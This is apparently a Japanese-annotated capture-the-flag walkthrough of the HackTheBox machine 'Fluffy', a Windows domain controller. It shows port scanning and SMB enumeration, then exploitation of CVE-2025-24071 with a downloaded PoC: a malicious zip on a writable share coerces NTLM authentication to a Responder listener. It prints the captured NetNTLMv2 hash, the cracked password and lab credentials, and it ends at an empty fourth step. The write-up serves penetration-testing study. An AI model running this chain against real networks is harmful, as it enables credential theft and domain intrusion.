## STEP 1
```sh
└─$ rustscan -a 10.129.205.2 --scripts none
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.205.2:53
Open 10.129.205.2:88
Open 10.129.205.2:139
Open 10.129.205.2:389
Open 10.129.205.2:445
Open 10.129.205.2:464
Open 10.129.205.2:593
Open 10.129.205.2:636
Open 10.129.205.2:3269
Open 10.129.205.2:3268
Open 10.129.205.2:5985
Open 10.129.205.2:9389
Open 10.129.205.2:49667
Open 10.129.205.2:49689
Open 10.129.205.2:49690
Open 10.129.205.2:49702
Open 10.129.205.2:49697
Open 10.129.205.2:49712
Open 10.129.205.2:49731
10.129.205.2 -> [53,88,139,389,445,464,593,636,3269,3268,5985,9389,49667,49689,49690,49702,49697,49712,49731]
```
```sh
└─$ nmap -n -Pn -p 53,88,139,389,445,464,593,636,3269,3268,5985,9389,49667,49689,49690,49702,49697,49712,49731 -sV 10.129.205.2
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 07:33 EDT
Nmap scan report for 10.129.205.2
Host is up (0.48s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-28 18:35:04Z)
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fluffy.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49712/tcp open  msrpc         Microsoft Windows RPC
49731/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.02 seconds
```


## STEP 2
提供されているクレデンシャルで、smb列挙
```sh
└─$ smbmap -H 10.129.205.2 -u j.fleischman -p J0elTHEM4n1990!

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.205.2:445        Name: 10.129.205.2              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```
ITフォルダ内にpdfを発見
```sh
└─$ smbmap -H 10.129.205.2 -r IT -u j.fleischman -p J0elTHEM4n1990!

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.129.205.2:445        Name: 10.129.205.2              Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        IT                                                      READ, WRITE
        ./IT
        dr--r--r--                0 Sat Jun 28 14:41:00 2025    .
        dr--r--r--                0 Sat Jun 28 14:41:00 2025    ..
        dr--r--r--                0 Fri May 16 10:51:49 2025    Everything-1.4.1.1026.x64
        fr--r--r--          1827464 Fri May 16 10:51:49 2025    Everything-1.4.1.1026.x64.zip
        dr--r--r--                0 Fri May 16 10:51:49 2025    KeePass-2.58
        fr--r--r--          3225346 Fri May 16 10:51:49 2025    KeePass-2.58.zip
        fr--r--r--           169963 Sat May 17 10:31:07 2025    Upgrade_Notice.pdf
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections
```
pdfダウンロード
```sh
└─$ smbget -U j.fleischman%J0elTHEM4n1990! smb://10.129.205.2/IT/Upgrade_Notice.pdf
Using domain: WORKGROUP, user: j.fleischman
smb://10.129.205.2/IT/Upgrade_Notice.pdf
Downloaded 165.98kB in 7 seconds
```


## STEP 3
CVE-2025-24071のPoCダウンロード
```sh
└─$ wget https://raw.githubusercontent.com/0x6rss/CVE-2025-24071_PoC/refs/heads/main/poc.py               
--2025-06-28 07:45:07--  https://raw.githubusercontent.com/0x6rss/CVE-2025-24071_PoC/refs/heads/main/poc.py
Connecting to 192.168.20.37:8080... connected.
Proxy request sent, awaiting response... 200 OK
Length: 1003 [text/plain]
Saving to: ‘poc.py’

poc.py                                                     100%[========================================================================================================================================>]    1003  --.-KB/s    in 0s      

2025-06-28 07:45:07 (46.9 MB/s) - ‘poc.py’ saved [1003/1003]


└─$ python3.13 poc.py 
Enter your file name: fluffy
Enter IP (EX: 192.168.1.162): 10.10.16.11
completed
```
数10秒後に、NTLMハッシュを取得できた
```sh
smb: \> put exploit.zip 
putting file exploit.zip as \exploit.zip (0.3 kb/s) (average 0.4 kb/s)
```
```
└─$ sudo responder -I tun0 -v
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.5.0

  To support this project:
  Github -> https://github.com/sponsors/lgandx
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    MQTT server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]
    SNMP server                [OFF]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.11]
    Responder IPv6             [dead:beef:4::1009]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP', 'ISATAP.LOCAL']
    Don't Respond To MDNS TLD  ['_DOSVC']
    TTL for poisoned response  [default]

[+] Current Session Variables:
    Responder Machine Name     [WIN-H0WNSIA6D31]
    Responder Domain Name      [VEFP.LOCAL]
    Responder DCE-RPC Port     [49932]

[+] Listening for events...                                                                                                                                                                                                                 

[SMB] NTLMv2-SSP Client   : 10.129.205.2
[SMB] NTLMv2-SSP Username : FLUFFY\p.agila
[SMB] NTLMv2-SSP Hash     : p.agila::FLUFFY:0699c78ffe4826ea:CE13B2C281808A91624EF47240443F5B:0101000000000000007563F101E8DB017D7CB08278A351AA0000000002000800560045004600500001001E00570049004E002D004800300057004E00530049004100360044003300310004003400570049004E002D004800300057004E0053004900410036004400330031002E0056004500460050002E004C004F00430041004C000300140056004500460050002E004C004F00430041004C000500140056004500460050002E004C004F00430041004C0007000800007563F101E8DB010600040002000000080030003000000000000000010000000020000085C78096B6FEBBB44BC9EE5273690B696C547E4406D1196E59759F00CA7BC72F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310031000000000000000000
```
```sh
└─$ echo "p.agila::FLUFFY:1f2e6d8c1ccd0a6e:7B37D120D7015CCEEFAB1FDC59A4F324:0101000000000000007563F101E8DB01CF12B54903F6406C0000000002000800560045004600500001001E00570049004E002D004800300057004E00530049004100360044003300310004003400570049004E002D004800300057004E0053004900410036004400330031002E0056004500460050002E004C004F00430041004C000300140056004500460050002E004C004F00430041004C000500140056004500460050002E004C004F00430041004C0007000800007563F101E8DB010600040002000000080030003000000000000000010000000020000085C78096B6FEBBB44BC9EE5273690B696C547E4406D1196E59759F00CA7BC72F0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310031000000000000000000" > hash.txt



└─$ hashcat -a 0 -m 5600 hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-1165G7 @ 2.80GHz, 2056/4176 MB (1024 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

P.AGILA::FLUFFY:1f2e6d8c1ccd0a6e:7b37d120d7015cceefab1fdc59a4f324:0101000000000000007563f101e8db01cf12b54903f6406c0000000002000800560045004600500001001e00570049004e002d004800300057004e00530049004100360044003300310004003400570049004e002d004800300057004e0053004900410036004400330031002e0056004500460050002e004c004f00430041004c000300140056004500460050002e004c004f00430041004c000500140056004500460050002e004c004f00430041004c0007000800007563f101e8db010600040002000000080030003000000000000000010000000020000085c78096b6febbb44bc9ee5273690b696c547e4406d1196e59759f00ca7bc72f0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310036002e00310031000000000000000000:prometheusx-303
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: P.AGILA::FLUFFY:1f2e6d8c1ccd0a6e:7b37d120d7015cceef...000000
Time.Started.....: Sat Jun 28 08:00:19 2025 (7 secs)
Time.Estimated...: Sat Jun 28 08:00:26 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   674.2 kH/s (1.21ms) @ Accel:512 Loops:1 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4517888/14344385 (31.50%)
Rejected.........: 0/4517888 (0.00%)
Restore.Point....: 4516864/14344385 (31.49%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: promo1992++ -> progree
Hardware.Mon.#1..: Util: 49%

Started: Sat Jun 28 08:00:09 2025
Stopped: Sat Jun 28 08:00:27 2025
```


## STEP 4
